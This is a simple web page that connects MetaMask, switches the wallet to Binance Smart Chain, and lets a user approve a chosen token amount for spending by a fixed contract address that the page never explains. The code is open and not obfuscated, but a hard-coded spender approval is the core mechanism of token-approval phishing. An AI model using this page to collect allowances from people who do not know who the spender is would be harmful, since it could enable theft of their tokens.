<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>MetaMask BSC Token Approval</title>
  <script src="https://unpkg.com/ethers@5.7.2/dist/ethers.umd.min.js"></script>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #f4f4f4;
      padding: 40px;
      text-align: center;
    }
    #container {
      background: white;
      border-radius: 10px;
      padding: 30px;
      max-width: 500px;
      margin: auto;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
    }
    input, button {
      padding: 10px;
      font-size: 16px;
      margin: 10px 0;
      width: 90%;
      max-width: 400px;
      border-radius: 5px;
      border: 1px solid #ccc;
    }
    button {
      background: #4CAF50;
      color: white;
      cursor: pointer;
      border: none;
    }
    button:disabled {
      background: #999;
      cursor: not-allowed;
    }
    #status {
      margin-bottom: 20px;
      font-weight: bold;
    }
  </style>
</head>
<body>
  <div id="container">
    <div id="status">Please connect to MetaMask</div>
    <button id="connectButton">Connect to MetaMask</button>
    <br>
    <input type="text" id="tokenAddress" placeholder="Enter token address to approve">
    <input type="text" id="amount" placeholder="Enter amount to approve">
    <button id="approveButton" disabled>Approve</button>
  </div>

  <script>
    const scB_address = "0xb300000b72DEAEb607a12d5f54773D1C19c7028d";
    let signer;

    async function connect() {
      if (typeof window.ethereum === 'undefined') {
        document.getElementById('status').innerText = 'MetaMask is not installed!';
        return;
      }

      try {
        const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
        if (accounts.length === 0) throw new Error('No accounts found');
        
        const chainIdHex = await window.ethereum.request({ method: 'eth_chainId' });
        if (chainIdHex !== '0x38') {
          try {
            await window.ethereum.request({
              method: 'wallet_switchEthereumChain',
              params: [{ chainId: '0x38' }],
            });
          } catch (switchError) {
            if (switchError.code === 4902) {
              await window.ethereum.request({
                method: 'wallet_addEthereumChain',
                params: [{
                  chainId: '0x38',
                  chainName: 'Binance Smart Chain',
                  nativeCurrency: {
                    name: 'BNB',
                    symbol: 'BNB',
                    decimals: 18,
                  },
                  rpcUrls: ['https://bsc-dataseed.binance.org/'],
                  blockExplorerUrls: ['https://bscscan.com'],
                }],
              });
              await window.ethereum.request({
                method: 'wallet_switchEthereumChain',
                params: [{ chainId: '0x38' }],
              });
            } else {
              throw switchError;
            }
          }
        }

        const network = { chainId: 56, ensAddress: null };
        const provider = new ethers.providers.Web3Provider(window.ethereum, network);
        signer = provider.getSigner();
        const address = await signer.getAddress();

        document.getElementById('status').innerText = `Connected to: ${address}`;
        document.getElementById('approveButton').disabled = false;
      } catch (error) {
        document.getElementById('status').innerText = `Connection failed: ${error.message}`;
        console.error(error);
      }
    }

    async function approve() {
      const tokenAddressInput = document.getElementById('tokenAddress').value.trim();
      const amountInput = document.getElementById('amount').value.trim();

      if (!tokenAddressInput || !ethers.utils.isAddress(tokenAddressInput)) {
        document.getElementById('status').innerText = 'Invalid token address!';
        return;
      }

      if (!amountInput || isNaN(amountInput) || Number(amountInput) <= 0) {
        document.getElementById('status').innerText = 'Invalid amount!';
        return;
      }

      if (!signer) {
        document.getElementById('status').innerText = 'Connect to MetaMask first.';
        return;
      }

      try {
        const tokenAddress = ethers.utils.getAddress(tokenAddressInput);
        const spender = ethers.utils.getAddress(scB_address);

        const tokenAbi = [
          "function approve(address spender, uint256 amount) public returns (bool)",
          "function decimals() public view returns (uint8)"
        ];

        const tokenContract = new ethers.Contract(tokenAddress, tokenAbi, signer);
        const decimals = await tokenContract.decimals();
        const amount = ethers.utils.parseUnits(amountInput, decimals);

        document.getElementById('status').innerText = 'Approving... Please wait.';

        const tx = await tokenContract.approve(spender, amount);
        console.log('Transaction:', tx.hash);

        await tx.wait();
        document.getElementById('status').innerText = `Approved successfully! Tx: ${tx.hash}`;
      } catch (error) {
        document.getElementById('status').innerText = `Approval failed: ${error.message}`;
        console.error(error);
      }
    }

    document.getElementById('connectButton').addEventListener('click', connect);
    document.getElementById('approveButton').addEventListener('click', approve);
  </script>
</body>
</html>
